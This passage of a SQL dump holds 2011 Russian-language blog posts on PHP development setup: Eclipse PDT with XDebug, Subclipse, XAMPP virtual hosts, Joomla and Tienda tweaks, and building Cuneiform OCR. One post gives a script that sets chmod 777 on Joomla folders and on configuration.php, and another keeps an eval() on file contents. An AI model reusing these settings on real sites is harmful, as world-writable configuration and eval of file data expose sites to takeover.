'/uploads/2014/02/pierievodchik-slovar-v-google-chrome.png', 1, NULL, '2011-01-20 22:25:26'),
(31, 'Eclipse PDT + Ubuntu 10.10. Часть 2', 'eclipse-pdt-ubuntu-10-10-chast-2', '<div class="alert alert-warning">Если Вы уже установили <strong>Eclipse</strong>, и подготовили к&nbsp;созданию нового проекта то пора приступить к следующей части, настройка <strong>Eclipse</strong> под наши нужды и создание тестового проекта.<br />\r\nОбязательно <a href="/articles/eclipse-pdt-ubuntu-10-10-chast-1">прочтите часть 1</a></div>\r\n<!--more-->\r\n\r\n<p>Запускаем <strong>Eclipse PDT</strong>, идем в Window-&gt;Preferens там находим <strong>PHP-&gt;PHP Servers</strong> <em><strong> Инфо:</strong> Если у вас в настройках нет пункта PHP, значит не установлен пакет PDT. Подробнее об установке Eclipse PDT читайте <a href="/articles/eclipse-pdt-ubuntu-10-10-chast-1">в предыдущей статье</a>.</em></p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/eclipse-deb-pref3.jpg" style="width: 500px; height: 299px;" /></p>\r\n\r\n<p>Выбираем место где у нас будут храниться файлы нашего проэкта, в моем случае это: <code>http://localhost/joomla_development</code> Выглядит это так:</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/eclipse-deb-pref4.jpg" style="width: 451px; height: 333px;" /></p>\r\n\r\n<p><span style="line-height: 1.2em;">Тест XDebug</span></p>\r\n\r\n<p>Теперь у нас будет небольшое практическое задание. Мы напишем небольшой PHP скрипт и изучим на его примере процесс отладки.</p>\r\n\r\n<h2>Терминология <strong>Eclipse</strong></h2>\r\n\r\n<p>Сперва разберем некоторую терминологию. В пользовательском интерфейсе <strong>Eclipse</strong> есть несколько основных понятий: рабочий стол, вид и перспектива. <strong>Рабочий стол (workbench)</strong> - это впринципе все что помещается на экран. Рабочий стол <strong>Eclipse</strong> состоит из области редактирования, где мы будем писать и править наш <strong>PHP</strong> код. И ряд видов вокруг. Вид - это область где отображается информация о файле, или любой другой вывод. Перспектива - это просто распределенные настройки вида. Нам будут интересны две перспективы&nbsp;<strong>PHP perspective</strong> и <strong>PHP Debug perspective</strong>. Чтобы открыть нужную нам перспективу идем в Window-&gt;Open perspective-&gt;PHP - &nbsp;если <strong>PHP</strong> отсутствует в списке жмем Other, и выбираем в новом окне. Теперь на рабочем столе у нас отобразилось некоторый набор видов.</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/eclipse-deb-pref5.jpg" style="width: 411px; height: 237px;" /></p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/eclipse-deb-pref6.jpg" style="width: 486px; height: 202px;" /></p>\r\n\r\n<h2>Создаем проект</h2>\r\n\r\n<p>Для каждого отдельного скрипта, мы создаем отдельный проект. Идем в File-&gt;NewPHP Project называем наш проект <strong>Test Debug</strong> и жмем Finish</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/php-project-_0031.png" style="width: 500px; height: 514px;" /></p>\r\n\r\n<p>Теперь мы можем наблюдать наш проект в <strong>PHP Explorer view</strong>. Для создания первого <strong>PHP</strong> файла нажимаем правой кнопкой на папке с нашим проектом и выбираем New-&gt;PHP file. К нам выйдет мастер создания нового PHP файла где мы укажем имя файла, напр. test.php</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/new-php-file-_0042.png" style="width: 584px; height: 500px;" /></p>\r\n\r\n<p>В открывшимся редакторе напишем следующий код:</p>\r\n\r\n<pre>\r\n<code class="php">&lt;?php echo &quot;Это мой тестовый компонент&quot;;\r\n$myvar = &quot;Это моя переменная&quot;;\r\nphpinfo();\r\n?&gt;</code></pre>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/php-project-_005.png" style="width: 396px; height: 132px;" /></p>\r\n\r\n<p>Сохраняем, в <strong>PHP Explorer</strong> (далее проводник) выбираем наш файл, кликаем правой кнопкой мыши, выбираем Run As-&gt;PHP Web page Примечание. У меня на данном этапе вылезла ошибка из-за невозможности определить дефолтный браузер. Решается эта проблема следующим образом. Идем в Window-&gt;Preferens-&gt;General-&gt;Web Browser <img alt="" class="img-responsive" src="/uploads/2011/01/php-project-_006.png" style="width: 500px; height: 406px;" /> Я выбрал дефолтным веб браузером <strong>Chromium</strong> чего и вам желаю :) Для этого нажимаем New и вводим следующие параметры:<br />\r\nname: На ваше усмотрение<br />\r\nLocation: /usr/bin/chromium-browser<br />\r\n<img alt="" class="img-responsive" src="/uploads/2011/01/php-project-_007.png" style="width: 500px; height: 242px;" /> Путь к вашему браузеру, да и вобщем то сам браузер может отличаться от моего, для этого найдите (создайте) ярлык для своего приложения, кликните правой кнопкой-&gt;свойства. Копируем поле &quot;команда&quot; без параметров, т.е. до знака % <img alt="" class="img-responsive" src="/uploads/2011/01/php-project-_008.png" style="width: 500px; height: 197px;" /> Не забудьте предварительно запустить Вэб сервер, иначе вам выдаст сообщение о том что &quot;Невозможно отобразить страницу&quot;. После всего проделаного мой скрипт все таки запустился но вместо русского отображались крокозябры. Решил это так. Добавил в начало нашего скрипта код:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n<meta content="text/html; charset=utf-8" http-equiv="content-type" />\r\n<p>Вот что получилось</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/php-project-_009.png" style="width: 500px; height: 363px;" /></p>', '/uploads/2014/02/eclipse-pdt-ubuntu-10-10-chast-2.jpeg', 1, NULL, '2011-01-23 17:02:19');
INSERT INTO `articles` (`id`, `title`, `slug`, `text`, `image`, `publish`, `weight`, `created_at`) VALUES
(32, 'Eclipse PDT + Ubuntu 10.10. Часть 3. Отладка с помощью XDebug, Установка Subversopn (SVN)', 'eclipse-pdt-ubuntu-10-10-chast-3-otladka-s-pomoshch-iu-xdebug-ustanovka-subversopn-svn', '<p>В частях 2 и 1 мы ознакомились с тем как устанавливать<strong> Eclipse XDebug на Ubuntu 10.10</strong> и создать свой первый простейший (так и хочется назвать одноклеточный :)) скрипт. Теперь нам предстоит научиться отлаживать программу с помощью <strong>XDebug</strong>. <!--more-->Жмем правой кнопкой на нашем скрипте и выбираем&nbsp;<strong>Debug As </strong>/ PHP Web Page В этот момент <strong>Eclipse</strong> предложит нам открыть <strong>Debug</strong> перспективу, с чем мы вежливо соглашаемся:</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/php-project-_010.png" style="width: 500px; height: 173px;" /></p>\r\n\r\n<p>Вообще мы можем выбирать ту перспективу которая нам нужна в данный момент из меню Window-&gt;Open Perspective. После входа в <strong>Debug</strong> песпективу мы увидим что <strong>Debuger</strong> остановился на первой <strong>PHP</strong> строке.</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/php-project-_011.png" style="width: 500px; height: 154px;" /></p>\r\n\r\n<p>Теперь посмотрим немного выше, где у нас распологаються кнопки управления <strong>XDebug</strong></p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/eclipse-debug-button.png" style="width: 525px; height: 360px;" /></p>\r\n\r\n<p>1. Начать отладку скрипта. Перед тем как запускать отладку, необходимо удостовериться что предыдущая отладка завершена (3) 2. Запустить полностью весь скрипт. На данном этапе, с теми настройками которые у нас есть, мы отлаживаем программу по строчно, но можно &quot;снять с паузы&quot; и продолжить выполнение до конца. 3. Остановить выполнение отладки скрипта. Обязательное условие для повторной отладки. 4. Следующий шаг. Т.к. в настройках ранее мы выбрали что наш скрипт будет отлаживаться по-шагово, то при нажатии на эту кнопку отладчик переходит к следующему событию/оператору. В правом верхнем углу у нас находятся кнопки выбора перспективы:</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/eclipse-perspective.png" style="width: 600px; height: 182px;" /></p>\r\n\r\n<p>между которыми мы можем свободно переключатся. В правом верхнем углу, чуть по ниже кнопок выбора перспективы находяться вид переменных, в которых мы можем наблюдать какие переменные у нас задействованны, и какие значения они принимают на каждом шаге нашой программы.</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/eclipse-variables.png" style="width: 557px; height: 337px;" /></p>\r\n\r\n<p>При старте отладки, как Вы уже успели заметить, открываеться выбранный ранее в настройках браузер, в котором также по шагово отображается информация которая приходит от нашей программы находящейся на отладке. Таким образом мы можем контролировать процесс. Если мы дойдем до конца программы, то это вовсе не означает что процесс отладки окончен. Нам нужно нажать на кнопку 3 что бы его завершить, иначе новый сеанс не запуститься. По завершению откроется новое окно браузера в котором нам сообщат об окончании отладки скрипта. А для того чтобы в дальнейшем <strong>Eclipse PDT</strong> не &quot;напрягал&quot; нас вопросами о том &quot;хотим ли мы открыть соответствующую перспективу&quot; при отладке, можно в настройках (Window-&gt;Preference) это явно указать.</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/eclipse-preference-perspective-launch.png" style="width: 536px; height: 424px;" /></p>\r\n\r\n<p>На этом все. Мы научились отлаживать наши программы в <strong>Eclipse PDT</strong>. В следующей статье я раскрою очень важную тему<strong> Eclipse Subversion</strong>. Keep smiling! :)</p>\r\n\r\n<h3>Установка&nbsp;Subversion (SVN)</h3>\r\n\r\n<p><strong>Subversion (SVN) </strong>- это сторонний плагин<strong> Eclipse </strong>который необходим для работы с Системой управления версиями&nbsp;исходного кода разрабатываемых (и не только нами, а иначе зачем это все нада :) ) нами программ.</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/eclipse-new-plagin.jpg" style="width: 297px; height: 312px;" /></p>\r\n\r\n<p>Идем в Help-&gt;Install New Software. В диалоговом окне выбираем Add</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/eclipse-add-install.png" style="width: 550px; height: 496px;" /></p>\r\n\r\n<p><span style="line-height: 1.6em;">В качестве названия (name) даем любое удобочитаемое имя, напр&nbsp;</span><strong style="line-height: 1.6em;">Subclipse</strong><span style="line-height: 1.6em;">, в поле размещение (Location) пишем &quot;</span><strong style="line-height: 1.6em;">http://subclipse.tigris.org/update_1.6.x</strong><span style="line-height: 1.6em;">&quot;</span></p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/eclipse-sorce.png" style="width: 640px; height: 221px;" /></p>\r\n\r\n<p><span style="line-height: 1.6em;">Выбираем все три доступных пакета</span></p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/eclipse-add-install2.png" style="width: 550px; height: 430px;" /></p>\r\n\r\n<p><span style="line-height: 1.6em;">Жмем Next до упора, пока нам не покажут лицензию, которую мы принимаем и жмем Finish. Возможно нам выдаст некоторые сообщения о возможной несовместимости - соглашаемся со всем. Далее нас попросят перезагрузить </span><strong style="line-height: 1.6em;">Eclipse</strong><span style="line-height: 1.6em;"> с чем мы вежливо соглашаемся. После перезапуска мы можем проверить установку нашего плагина. Заходим в File-&gt;Import...</span></p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/eclipse-subv.jpg" style="width: 550px; height: 575px;" /></p>\r\n\r\n<p><span style="line-height: 1.6em;">В новом окне находим </span><strong style="line-height: 1.6em;">SVN</strong></p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/eclipse-subv21.png" style="width: 550px; height: 437px;" /></p>\r\n\r\n<p><span style="line-height: 1.6em;">Если такой пункт присутствует, то будем считать что мы успешно установили </span><strong style="line-height: 1.6em;">Eclipse Subversion</strong><span style="line-height: 1.6em;">. В следующей статье мы поговорим о том как импортировать </span><strong style="line-height: 1.6em;">Joomla! project</strong><span style="line-height: 1.6em;"> с помощью </span><strong style="line-height: 1.6em;">Eclipse Subversion (SVN)</strong></p>', '/uploads/2014/02/eclipse-pdt-ubuntu-10-10-chast-3-otladka-s-pomoshch-iu-xdebug-ustanovka-subversopn-svn.jpeg', 1, NULL, '2011-02-16 23:48:13'),
(33, 'Komodo Edit 6 в Ubuntu 10.10', 'komodo-edit-6-v-ubuntu-10-10', '<p>На днях понадобилось быстро скомпоновать <strong>html</strong> страничку для печати. Установил <strong>BlueFish</strong> и не нашел там быстрого просмотра. Понятное дело что всегда можно воспользоваться внешним браузером, но переключаться постоянно между окнами только для того чтобы посмотреть промежуточный результат не совсем удобно, а использовать для этих целей <strong>IDE</strong> (как то <strong>Eclipse</strong> или <strong>NetBeans</strong>) это как из пушки по воробьям. На официальном сайте <strong>Komodo</strong> версии для <strong>Ubuntu/Debian</strong> отсутствовала, пришлось качать как есть... <!--more-->Скачать актуальную на момент написания статьи версию <a href="http://ubuntuone.com/p/cdv/">можно скачать у меня</a>, или <a href="http://www.activestate.com/komodo-edit">перейти на сайт разработчика</a> и там скачать последнюю. Распаковуем архив в любую папку на компьютере. Открываем консоль (Приложения-&gt;Стандартные-&gt;Терминал) переходим в паку где куда мы распаковали наш архив:</p>\r\n\r\n<pre>\r\n<code class="bash">cd /home/&lt;Имя_пользователя&gt;/Komodo-Edit-6.1.0-7212-linux-libcpp6-x86</code></pre>\r\n\r\n<p>Если все нормально, и мы перешли в папку с программой, то пробуем ее установить коммандой:</p>\r\n\r\n<pre>\r\n<code class="bash">sudo bash install.sh</code></pre>\r\n\r\n<p>После недолгих раздумий нам выдаст вопрос о том куда устанавливать. Если просто нажать Enter то в домашней директории будет создана папка <strong>Komodo-Edit-6 </strong>куда, собственно, и будет произведена установка. Установка длиться несколько минут закончиться должна приблизительно так:</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/02/komodo1.jpg" style="width: 500px; height: 359px;" /></p>\r\n\r\n<p>Установили? Теперь совсем все просто, следуя инструкциям изложенным в терминале после установки, создадим ссылку на программу:</p>\r\n\r\n<pre>\r\n<code class="bash">sudo ln -s &quot;/home/spolischook/Komodo-Edit-6/bin/komodo&quot; /usr/local/bin/komodo</code></pre>\r\n\r\n<p>Теперь набираем в терминале:</p>\r\n\r\n<pre>\r\n<code class="bash">komodo</code></pre>\r\n\r\n<p>и радуемся новому инструменту разработки. :) Keep smiling!</p>', '/uploads/2014/02/komodo-edit-6-v-ubuntu-10-10.jpeg', 1, NULL, '2011-02-10 23:55:24'),
(34, 'XAMPP + Ubuntu 10.10. Настройка виртуальных хостов', 'xampp-ubuntu-10-10-nastroika-virtual-nykh-khostov', '<p>Мало установить <strong>XAMPP</strong> нужно еще на нем работать. Обычно одновременно на разработке находяться несколько сайтов, поэтому для полноценной работы нам необходимо настроить <strong>виртуальные хосты</strong>.<!--more--> Для начала раскомментируем <strong>виртуальные хосты</strong> в файле</p>\r\n\r\n<pre>\r\n<code class="bash">sudo gedit /opt/lampp/etc/httpd.conf</code></pre>\r\n\r\n<p><span style="line-height: 1.6em;">убрав знак # в начале строки:</span></p>\r\n\r\n<pre>\r\n<code>Include etc/extra/httpd-vhosts.conf</code></pre>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/02/vhost.png" style="width: 500px; height: 409px;" /></p>\r\n\r\n<p>Перезапускаем сервер кнопкой на панеле, а лучше командой в командной строке:</p>\r\n\r\n<pre>\r\n<code class="bash">sudo /opt/lampp/lampp restart</code></pre>\r\n\r\n<p>Так мы увидем все ошибки, если таковые будут. У меня к примеру выдало следующее:</p>\r\n\r\n<pre>\r\n<code class="bash">Warning: DocumentRoot [/www/docs/dummy-host.example.com] does not exist\r\nWarning: DocumentRoot [/www/docs/dummy-host2.example.com] does not exist</code></pre>\r\n\r\n<p>Как <strong>Apache</strong> разбирает файл конфигурации, до него мы еще дойдем, можно увидеть при выводе следующей комманды:</p>\r\n\r\n<pre>\r\n<code class="bash">/opt/lampp/bin/httpd -S</code></pre>\r\n\r\n<p>У меня вывалились те же ошибки + конфигурация. Давайте начнем настраивать наш сервер для работы с <strong>виртуальными хостами</strong>. Для начала откроем <strong>файл конфигурации</strong>:</p>\r\n\r\n<pre>\r\n<code class="bash">sudo gedit /opt/lampp/etc/extra/httpd-vhosts.conf</code></pre>\r\n\r\n<p>Проверяем чтобы строка:</p>\r\n\r\n<pre>\r\n<code>NameVirtualHost *:80</code></pre>\r\n\r\n<p>была раскомментирована. В <strong>NameVirtualHost</strong> мы должны указать IP адрес и (по-возможности) порт на нашем сервере, который будет принимать запросы для наших хостов. Обычно, а наш случай совсем обычный :), когда любой IP на нашем сервере может быть использован, мы указываем *. Порт будем использовать 80 (<a href="http://ru.wikipedia.org/wiki/%D0%A1%D0%BF%D0%B8%D1%81%D0%BE%D0%BA_%D0%BF%D0%BE%D1%80%D1%82%D0%BE%D0%B2_TCP_%D0%B8_UDP" target="_blank">HTTP</a>) Следующим шагом у нас идет создание двух тестовых (для примера) виртуальных хоста заключенных в тэги:</p>\r\n\r\n<pre>\r\n<code>&lt;VirtualHost&gt;&lt;/VirtualHost&gt;</code></pre>\r\n\r\n<p><span style="line-height: 1.6em;">С указанием порта в первом (в нашем случае это опять *:80) Минимально блок должен содержать дерективы </span><strong style="line-height: 1.6em;">ServerName</strong><span style="line-height: 1.6em;"> для определения имени </span><strong style="line-height: 1.6em;">виртуального хоста</strong><span style="line-height: 1.6em;">, и </span><strong style="line-height: 1.6em;">DocumentRoot</strong><span style="line-height: 1.6em;"> для определения папки размещения файлов проэкта. Первый блок считается блоком по умолчанию, именно поэтому при наборе http://localhost, там где раньше у нас был </span><strong style="line-height: 1.6em;">XAMPP</strong><span style="line-height: 1.6em;"> теперь странная ошибка:</span></p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/02/error-vhost.png" style="width: 533px; height: 281px;" /></p>\r\n\r\n<p><span style="line-height: 1.6em;">Итак первая запись будет выглядеть следующим образом:</span></p>\r\n\r\n<pre>\r\n<code>&lt;VirtualHost *:80&gt;\r\n    ServerAdmin admin@xampp.ua\r\n    DocumentRoot /opt/lampp/htdocs/xampp\r\n    ServerName xampp.ua\r\n&lt;/VirtualHost&gt;</code></pre>\r\n\r\n<p><span style="line-height: 1.6em;">Теперь наш виртуальный хост пропишем здесь:</span></p>\r\n\r\n<pre>\r\n<code class="bash">sudo gedit /etc/hosts</code></pre>\r\n\r\n<p>В этом файле впишем строку:</p>\r\n\r\n<pre>\r\n<code>127.0.0.1	       xampp.ua</code></pre>\r\n\r\n<p>Перезапускаем <strong>XAMPP</strong> из командной строки:</p>\r\n\r\n<pre>\r\n<code class="bash">sudo /opt/lampp/lampp restart</code></pre>\r\n\r\n<p>Ошибок теперь должно вылазить на одну меньше, и по адресам http://localhost и http://xampp.ua у нас будет выдавать одинаковые данные:</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/02/xamppua.png" style="width: 530px; height: 256px;" /></p>\r\n\r\n<p>По аналогии остальные <strong>хосты</strong>. Можно сделать это с помощью автоматического скрипта, правда я не знаю насколько это необходимо. Жду Ваших комментариев.</p>', '/uploads/2014/02/xampp-ubuntu-10-10-nastroika-virtual-nykh-khostov.png', 1, NULL, '2011-02-16 04:47:53'),
(35, 'Шаблон Mynxx от Rockettemplate для Joomla 1.5', 'shablon-mynxx-ot-rockettemplate-dlia-joomla-1-5', '<p>Нашел очень хорошую тему для интернет магазина, после недолгого шаманства, шаблон все таки встал, но вот отображаться во фронтэнде напрочь отказался. Выдал ошибку:</p>\r\n\r\n<pre>\r\n<code class="html">Fatal error: Class &#39;JFile&#39; not found in /home/content/e/n/f/enfurno23/html/templates/rt_mynxx_j15/rt_utils.php on line 16</code></pre>\r\n<!--more-->\r\n\r\n<p>Решение подсмотрел на англоязычном форуме. Такое же простое как и ошибка :) Заменим следующий код:</p>\r\n\r\n<pre>\r\n<code class="php">if (JFile::exists($menu_params_file)) :\r\n$menu_params_content = file_get_contents($menu_params_file);\r\neval(&quot;\\$module-&gt;params = \\&quot;$menu_params_content\\&quot;;&quot;);\r\nendif;\r\n$topnav = $renderer-&gt;render( $module, $options );</code></pre>\r\n\r\n<p>на:</p>\r\n\r\n<pre>\r\n<code class="php">​if (jimport(&#39;joomla.filesystem.file&#39;)) :\r\n$menu_params_content = file_get_contents($menu_params_file);\r\neval(&quot;\\$module-&gt;params = \\&quot;$menu_params_content\\&quot;;&quot;);\r\nendif;\r\n$topnav = $renderer-&gt;render( $module, $options );</code></pre>', '/uploads/2014/02/shablon-mynxx-ot-rockettemplate-dlia-joomla-1-5.png', 1, NULL, '2011-02-21 16:16:40'),
(36, 'Права на папки Joomla! автоматически!', 'prava-na-papki-joomla-avtomatichieski', '<p>Все очень просто. После установки <strong>Joomla!</strong> на локальный сервер под <strong>Linux</strong>, непременно появляется необходимость изменить права доступа на папки для дальнейшей работы, напр. для установки приложений. Делать это вручную задача долгая, нудная и не благодарная. Нашел простенький скрипт для <strong>Joomla</strong>! 1.0 переделал его под <strong>Joomla</strong>! 1.5.<!--more-->Создаем новый файл через <strong>gedit</strong> или любой другой полюбившийся Вам текстовый редактор. Назовем его <strong>chmod.sh</strong>. В него запишем следующий код:</p>\r\n\r\n<pre>\r\n<code class="bash">#!/bin/sh\r\nsudo chmod 777 administrator/backups/\r\nsudo chmod 777 administrator/components/\r\nsudo chmod 777 administrator/language/\r\nsudo chmod 777 administrator/language/en-GB/\r\nsudo chmod 777 administrator/language/ru-RU/\r\nsudo chmod 777 administrator/cache/\r\nsudo chmod 777 language/en-GB/\r\nsudo chmod 777 language/pdf_fonts/\r\nsudo chmod 777 language/ru-RU/\r\nsudo chmod 777 plugins/\r\nsudo chmod 777 plugins/content/\r\nsudo chmod 777 plugins/editors/\r\nsudo chmod 777 plugins/editors-xtd/\r\nsudo chmod 777 plugins/search/\r\nsudo chmod 777 plugins/system/\r\nsudo chmod 777 plugins/user/\r\nsudo chmod 777 plugins/xmlrpc/\r\nsudo chmod 777 administrator/modules/\r\nsudo chmod 777 administrator/templates/\r\nsudo chmod 777 cache/\r\nsudo chmod 777 components/\r\nsudo chmod 777 images/\r\nsudo chmod 777 images/banners/\r\nsudo chmod 777 images/stories/\r\nsudo chmod 777 language/\r\nsudo chmod 777 media/\r\nsudo chmod 777 modules/\r\nsudo chmod 777 templates/\r\nsudo chmod 777 logs/\r\nsudo chmod 777 tmp/\r\nsudo touch configuration.php\r\nsudo chmod 777 configuration.php\r\nsudo mv htaccess.txt .htaccess</code></pre>\r\n\r\n<p><span style="line-height: 1.6em;">После этого открываем терминал и переходим в корневую папку где установлен новый </span><strong style="line-height: 1.6em;">Joomla</strong><span style="line-height: 1.6em;"> сайт. Если мы используем </span><strong style="line-height: 1.6em;">XAMPP</strong><span style="line-height: 1.6em;"> наш путь будет выглядеть следующими образом:</span></p>\r\n\r\n<pre>\r\n<code class="bash">cd /opt/lampp/htdocs/mysite</code></pre>\r\n\r\n<p><span style="line-height: 1.6em;">&#39;mysite&#39; замените на папку с Вашим проэктом. После этого запускаем скрипт указывая полный путь к нему. В моем случае, если скрипт находится в папке с проэктом:</span></p>\r\n\r\n<pre>\r\n<code class="bash">sudo bash chmod.sh</code></pre>\r\n\r\n<p><span style="line-height: 1.6em;">Все готово! :)</span></p>', '/uploads/2014/02/prava-na-papki-joomla-avtomatichieski.png', 1, NULL, '2011-03-14 23:40:31'),
(37, 'Denwer и кодировка UTF-8', 'denwer-i-kodirovka-utf-8', '<p>Недавно в который раз наткнулся на проблему несовместимости Джентельменского набора разработчика <strong>Denwer 3 </strong>и кодировки <strong>UTF-8</strong>. Но в этот я раз всерьез решил заняться решением этой проблемы. И решение нашлось как всегда очень простое. В директорию где разрабатывается Ваш скрипт нужно разместить файл <strong>.htaccess</strong> со следующим содержанием: <code>AddDefaultCharset utf-8</code> Теперь скрипты сохраненные в кодировке <strong>UTF-8</strong> отображаются правильно. Файл можно <a href="http://ubuntuone.com/p/iK7/" target="_blank" title="Скачать файл .htaccess::Denwer и кодировка UTF-8">скачать здесь</a> <strong>UPD:</strong> Пользователь lance подошел глобально:</p>\r\n\r\n<blockquote>httpd.conf отвечает за глобальные инструкции для сервера, т.е. внесенные в него изменения повлияют на все сайты, которые у нас будут храниться на сервере. Располагается он в каталоге /usr/local/apache/conf/. Отредактировать нам требуется всего одну строку: ищем &ldquo;AddDefaultCharset windows-1251&Prime; и меняем её на &ldquo;AddDefaultCharset utf-8&Prime;. мне это помогло!!! ))</blockquote>\r\n\r\n<p>Спасибо ему за это :)</p>', '/uploads/2014/02/denwer-i-kodirovka-utf-8.png', 1, NULL, '2011-03-18 22:03:55'),
(38, 'Валюта отображения товаров Tienda - магазин для Joomla!', 'valiuta-otobrazhieniia-tovarov-tienda-maghazin-dlia-joomla', '<p>Я так подозреваю что возможность отображать цены во фронтенде в <strong>валюте </strong>отличной от той что в базе будет в последующих версиях, но все равно опыт интересен, и я по просьбе lmd и по своему хотению решил немного покопаться в коде. Вот что я нарыл... <!--more--> Посмотрев шаблоны вывода цены, обнаружил что за это отвечает метод <strong>dispayPriceWithTax</strong> класса <strong>TiendaHelperProduct</strong> его можно найти по адресу <code>administrator/components/com_tienda/helpers/product.php</code> Выглядит он примерно так:</p>\r\n\r\n<pre>\r\n<code class="php">function dispayPriceWithTax($price=&#39;0&#39;, $tax=&#39;0&#39;, $show=&#39;0&#39;)\r\n{\r\n  $txt = &#39;&#39;;\r\n  if($show &amp;&amp; $tax)\r\n  {\r\n    if ($show == &#39;2&#39;)\r\n    {\r\n      $txt .= TiendaHelperBase::currency($price + $tax);\r\n    }\r\n    else\r\n    {\r\n      $txt .= TiendaHelperBase::currency($price);\r\n      $txt .= sprintf( JText::_(&#39;INCLUDE_TAX&#39;), TiendaHelperBase::currency($tax));\r\n    }\r\n  }\r\n  else\r\n  {\r\n    $txt .= TiendaHelperBase::currency($price);\r\n  }\r\n\r\n  return $txt;\r\n}</code></pre>\r\n\r\n<p><span style="line-height: 1.6em;">Как видим в любом случае (с налогами или без них) цену для нас добывает метод </span><strong style="line-height: 1.6em;">TiendaHelperBase::currency</strong><span style="line-height: 1.6em;">. Да прибудет с нами священный поиск... :) Находим его в: </span><code style="line-height: 1.6em;">administrator/components/co_tienda/helpers/_base.php</code><span style="line-height: 1.6em;"> И вот так он выглядит:</span></p>\r\n\r\n<pre>\r\n<code class="php">function currency($amount, $currency=&#39;&#39;, $options=&#39;&#39;)\r\n{\r\n  $currency_helper =&amp; TiendaHelperBase::getInstance( &#39;Currency&#39; );\r\n  $amount = $currency_helper-&gt;_($amount, $currency, $options);\r\n  return $amount;\r\n}</code></pre>\r\n\r\n<p><span style="line-height: 1.6em;">Второй параметр </span><strong style="line-height: 1.6em;">$currency</strong><span style="line-height: 1.6em;"> у нас пуст. По умолчанию дадим ему id валюты в которой мы хотим отображать цены на сайте. Это значение мы возьмем из таблицы валют </span><strong style="line-height: 1.6em;">tienda_currencies</strong><span style="line-height: 1.6em;"> поле </span><strong style="line-height: 1.6em;">currency_id</strong><span style="line-height: 1.6em;">. У меня валютой по умолчанию будет </span><strong style="line-height: 1.6em;">UAH </strong><span style="line-height: 1.6em;">и ее id = 5. Для меня код будет следующим:</span></p>\r\n\r\n<pre>\r\n<code class="php">function currency($amount, $currency=&#39;5&#39;, $options=&#39;&#39;)\r\n{\r\n  $currency_helper =&amp; TiendaHelperBase::getInstance( &#39;Currency&#39; );\r\n  $amount = $currency_helper-&gt;_($amount, $currency, $options);\r\n  return $amount;\r\n}</code></pre>\r\n\r\n<p><span style="line-height: 1.6em;">Вот с этих пор </span><strong style="line-height: 1.6em;">валюта </strong><span style="line-height: 1.6em;">отображения по умолчанию у нас есть. Но в модуле выбора </span><strong style="line-height: 1.6em;">валюты </strong><span style="line-height: 1.6em;">(если Вы им пользуетесь) при том что отображение в гривнах валюта базы данных по умолчанию т.е. </span><strong style="line-height: 1.6em;">USD</strong><span style="line-height: 1.6em;">, что смотрится не совсем красиво. Я предлагаю, дабы не заморачиваться с кодом, просто присвоить валютам что находятся впереди нашей валюты по умолчанию присвоить более высокие id. В моем случае у валюты </span><strong style="line-height: 1.6em;">USD </strong><span style="line-height: 1.6em;">id=1. Ей, через </span><strong style="line-height: 1.6em;">phpmyadmin</strong><span style="line-height: 1.6em;">, присваеваем id, например 8. Вуаля!</span></p>', NULL, 1, NULL, '2011-04-03 11:05:34'),
(39, 'Программа распознавания текста (OCR) для Ubuntu', 'proghramma-raspoznavaniia-tieksta-ocr-dlia-ubuntu', '<p>Вобщем то все просто.</p>\r\n\r\n<pre>\r\n<code class="bash">sudo apt-get install cmake imagemagick libmagick++-dev\r\nwget http://launchpadlibrarian.net/38612701/cuneiform-linux-0.9.0.tar.bz2\r\ntar xvjf cuneiform-linux-0.9.0.tar.bz2\r\ncd cuneiform-linux-0.9.0/ \r\nmkdir builddir\r\ncd builddir\r\ncmake -DCMAKE_BUILD_TYPE=debug ..\r\nmake\r\nsudo make install\r\nsudo ldconfig</code></pre>\r\n\r\n<p><span style="line-height: 1.6em;">Затем </span><a href="http://insdom.narod.ru/001/yagf_0.8.1-1_i386.deb" style="line-height: 1.6em;">станаливаем <strong>YAGF</strong></a><span style="line-height: 1.6em;"> Спасибо dmitry_k за столь простое решение. Все! :)</span></p>', NULL, 1, NULL, '2011-04-05 06:13:26'),
